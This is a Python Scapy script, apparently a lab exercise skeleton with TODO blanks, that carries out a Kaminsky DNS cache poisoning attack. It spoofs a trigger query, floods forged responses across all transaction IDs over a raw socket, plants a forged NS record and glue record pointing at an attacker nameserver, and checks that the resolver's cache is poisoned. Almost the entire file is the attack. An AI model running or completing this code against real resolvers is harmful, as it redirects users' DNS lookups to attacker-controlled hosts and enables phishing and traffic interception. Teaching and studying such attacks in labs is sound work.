import struct
import socket
import random
import string

from scapy.all import *
from common_library import *

# TODO: Set the MAX_TXID value to the maximum number of TXIDs you want to flood per attack iteration.
MAX_TXID = PUT_THE_MAX_TXID_HERE//80

print("[*] 1. Leaking resolver TXID/port via controlled domain...")
_, target_port = sniff_port_and_txid(5)
count=0
print("[*] 2. Open Socket for raw packet injection...")
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.bind(("eth0", 0))

while True:
    count+=1
    print("[*] 3. Generating random subdomain for cache evasion...")
    random_prefix = ''.join([random.choice(string.ascii_lowercase) for _ in range(6)])
    domain = "{}.example.com".format(random_prefix)

    print("[*] 4. Building the spoofed Kaminsky responses...")
    base_pkt = (
        Ether(dst="ff:ff:ff:ff:ff:ff") /
        IP(src=example_auth_dns, dst=target_dns) /
        UDP(sport=53, dport=target_port, chksum=0) /
        DNS(id=0, qr=1, aa=1, 
            qd=DNSQR(qname=domain),
            # ANSWER: Legitimate-looking response for the random subdomain
            an=DNSRR(rrname=domain, type='A', ttl=86400, rdata=fake_ip),
            
            # TODO: Change the NS record to point to "ns.attacker.com" instead of the real authoritative nameserver
            ns=DNSRR(rrname="PUT_THE_RIGHT_DOMAIN_HERE", type='PUT_THE_RIGHT_TYPE_HERE', ttl=86400, rdata="PUT_YOUR_DOMAIN_HERE"),
            
            # TODO: Add a glue record for the attacker domain pointing to the attacker's IP
            ar=DNSRR(rrname="PUT_THE_RIGHT_DOMAIN_HERE", type='PUT_THE_RIGHT_TYPE_HERE', ttl=86400, rdata=PUT_THE_RIGHT_IP_HERE)
        )
    )

    raw_bytes = bytearray(raw(base_pkt))
    
    all_pkts = []
    for txid in range(MAX_TXID):
        pkt = bytearray(raw_bytes)
        struct.pack_into('!H', pkt, 42, txid)
        all_pkts.append(bytes(pkt))

    #build the trigger packet to cause the resolver to query for the random subdomain
    trigger = build_spoofed_dns_request(attacker_ip, 12345, 53, domain, "A")
    l2_trigger = Ether(dst="ff:ff:ff:ff:ff:ff") / trigger
    raw_trigger = raw(l2_trigger)

    print("[*] 5. Flooding spoofed responses across all TXIDs on port {}...".format(target_port))
    start = time.time()
    s.send(raw_trigger)
    for pkts in all_pkts:
        s.send(pkts)

    print("[*] Finished sending spoofed responses in {:.4f} seconds.".format(time.time() - start))
    #print("[+] Kaminsky flood complete for {}!".format(domain))
    
    print("[*] 6. Verifying cache poisoning...")
    verification = build_spoofed_dns_request(attacker_ip, 12345, 53, domain, "A")
    ans = sr1(verification, timeout=3, verbose=0)
    print(ans.show() if ans else "No answer received")
    
    if ans and ans.haslayer(DNS) and ans[DNS].an:
        print("[+] Verification SUCCESS! {} resolves to {}".format(domain, ans[DNS].an.rdata))
        print("[+] Check the real authority with: dig @{} example.com NS".format(target_dns))
        
        break
    else:
        print("[-] Verification FAILED or timed out.")


#resolvec www.example.com, and show that it resolves to the attacker's IP instead of the real authoritative nameserver's IP
verification = build_spoofed_dns_request(attacker_ip, 12345, 53, "www.example.com", "A")
ans = sr1(verification, timeout=3, verbose=0)
print(ans.show() if ans else "No answer received")
print("Done in {} iterations.".format(count))
s.close()
